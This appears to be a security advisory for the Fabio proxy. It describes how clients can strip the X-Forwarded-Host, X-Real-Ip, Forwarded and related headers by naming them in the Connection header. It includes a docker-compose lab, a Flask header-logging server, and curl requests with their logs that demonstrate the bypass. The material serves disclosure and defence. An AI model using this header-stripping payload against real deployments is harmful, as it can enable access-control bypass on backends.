summary: "Fabio allows HTTP clients to manipulate custom headers it adds\n### Summary\nFabio\
  \ allows clients to remove X-Forwarded headers (except X-Forwarded-For) due to a vulnerability\
  \ in how it processes hop-by-hop headers.\n\nFabio adds HTTP headers like X-Forwarded-Host\
  \ and X-Forwarded-Port when routing requests to backend applications. Since the receiving\
  \ application should trust these headers, allowing HTTP clients to remove or modify them creates\
  \ potential security vulnerabilities.\n\nHowever, it was found that some of these custom headers\
  \ can indeed be removed and, in certain cases, manipulated. The attack relies on the behavior\
  \ that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the\
  \ following connection header, the X-Forwarded-Host header can, for example, be removed:\n\
  \n```\nConnection: close, X-Forwarded-Host\n```\n\nSimilar critical vulnerabilities have been\
  \ identified in other web servers and proxies, including [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813)\
  \ in Apache HTTP Server and [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv)\
  \ in Traefik.\n\n### Details\nIt was found that the following headers can be removed in this\
  \ way (i.e. by specifying them within a connection header):\n- X-Forwarded-Host\n- X-Forwarded-Port\n\
  - X-Forwarded-Proto\n- X-Real-Ip\n- Forwarded\n\n### PoC\nThe following docker-compose file\
  \ was used for testing:\n```yml\nversion: '3'\nservices:\n  fabio:\n    image: fabiolb/fabio\n\
  \    ports:\n      - \"3000:9999\"\n      - \"9998:9998\"\n    volumes:\n      - ./fabio.properties:/etc/fabio/fabio.properties\n\
  \n  backend:\n    build: .\n    ports:\n      - \"8080:8080\"\n    environment:\n      - PYTHONUNBUFFERED=1\n\
  ```\n\nThe fabio.properties configuration:\n```\nproxy.addr = :9999\nui.addr = :9998\nregistry.backend\
  \ = static\nregistry.static.routes = route add service / http://backend:8080/\n```\n\nA Python\
  \ container runs a simple HTTP server that logs received headers.\nThe Dockerfile:\n```dockerfile\n\
  FROM python:3.11-slim\n\nWORKDIR /app\n\nCOPY app.py .\n\nRUN pip install flask\n\nEXPOSE\
  \ 8080\n\nCMD [\"python\", \"app.py\"]\n```\n\nPython Flask Server\n```python\nfrom flask\
  \ import Flask, request\nimport sys\nimport os\n\nsys.stdout.flush()\nsys.stderr.flush()\n\
  os.environ['PYTHONUNBUFFERED'] = '1'\n\napp = Flask(__name__)\n\n@app.before_request\ndef\
  \ log_request_info():\n    print(\"HEADERS:\")\n    for header_name, header_value in request.headers:\n\
  \        print(f\"   {header_name}: {header_value}\")\n\n@app.route(\"/\", methods=['GET',\
  \ 'POST', 'PUT', 'DELETE', 'PATCH'])\ndef hello():\n    return f\"Hello, World! Method: {request.method}\"\
  \n\n@app.route(\"/<path:path>\", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])\ndef catch_all(path):\n\
  \    return f\"Caught path: {path}, Method: {request.method}\"\n\nif __name__ == \"__main__\"\
  :\n    app.run(host=\"0.0.0.0\", port=8080, debug=True)\n```\n\nA normal HTTP request/response\
  \ pair looks like this:\n#### Request \n```http\nGET / HTTP/1.1\nHost: 127.0.0.1:3000\nUser-Agent:\
  \ curl/8.7.1\nAccept: */*\nConnection: keep-alive\n```\n\ncurl command\n```bash\ncurl --path-as-is\
  \ -i -s -k -X $'GET' \\\n    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept:\
  \ */*' -H $'Connection: keep-alive' \\\n    $'http://127.0.0.1:3000/'\n```\n#### Response\n\
  ```http\nHTTP/1.1 200 OK\nServer: Werkzeug/3.1.3 Python/3.11.12\nDate: Thu, 22 May 2025 23:09:12\
  \ GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 25\nConnection: close\n\nHello,\
  \ World! Method: GET\n```\n\nServer Log\n```\nbackend-1  | HEADERS:\nbackend-1  |    Host:\
  \ 127.0.0.1:3000\nbackend-1  |    User-Agent: curl/8.7.1\nbackend-1  |    Accept: */*\nbackend-1\
  \  |    Forwarded: for=192.168.65.1; proto=http; by=172.24.0.3; httpproto=http/1.1\nbackend-1\
  \  |    X-Forwarded-For: 192.168.65.1\nbackend-1  |    X-Forwarded-Host: 127.0.0.1:3000\n\
  backend-1  |    X-Forwarded-Port: 3000\nbackend-1  |    X-Forwarded-Proto: http\nbackend-1\
  \  |    X-Real-Ip: 192.168.65.1\n```\n\nNext, a request, where the Forwarded header is defined\
  \ as a hop-by-hop header via the Connection header is sent:\n#### Request\n```http\nGET /\
  \ HTTP/1.1\nHost: 127.0.0.1:3000\nUser-Agent: curl/8.7.1\nAccept: */*\nyeet: 123\nConnection:\
  \ keep-alive, Forwarded\n```\n\ncurl command\n```bash\ncurl --path-as-is -i -s -k -X $'GET'\
  \ \\\n    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection:\
  \ keep-alive, Forwarded' \\\n    $'http://127.0.0.1:3000/'\n```\n#### Response\n```http\n\
  HTTP/1.1 200 OK\nContent-Length: 25\nContent-Type: text/html; charset=utf-8\nDate: Thu, 22\
  \ May 2025 23:42:45 GMT\nServer: Werkzeug/3.1.3 Python/3.11.12\n\nHello, World! Method: GET\n\
  ```\n\nServer Logs\n```\nbackend-1  | HEADERS:\nbackend-1  |    Host: 127.0.0.1:3000\nbackend-1\
  \  |    User-Agent: curl/8.7.1\nbackend-1  |    Accept: */*\nbackend-1  |    X-Forwarded-For:\
  \ 192.168.65.1\nbackend-1  |    X-Forwarded-Host: 127.0.0.1:3000\nbackend-1  |    X-Forwarded-Port:\
  \ 3000\nbackend-1  |    X-Forwarded-Proto: http\nbackend-1  |    X-Real-Ip: 192.168.65.1\n\
  ```\n\nThe response shows that Fabio's `Forwarded` header was removed from the request\n\n\
  ### Impact\nIf the backend application trusts these custom headers for security-sensitive\
  \ operations, their removal or modification may lead to vulnerabilities such as access control\
  \ bypass.\n\nThis vulnerability has a critical severity rating similar to  [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813)\
  \ (Apache HTTP Server, 9.8) and [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv)\
  \ (Traefik, 9.3)\n\nStripping headers like `X-Real-IP` can confuse the upstream server about\
  \ whether the request is coming from an external client through the reverse proxy or from\
  \ an internal source. This type of vulnerability can be exploited as demonstrated in: [Versa\
  \ Concerto RCE](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce).\n\
  \n### References\n-  [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv) \n\
  -  [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813)\n- [Versa Concerto RCE](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce)"
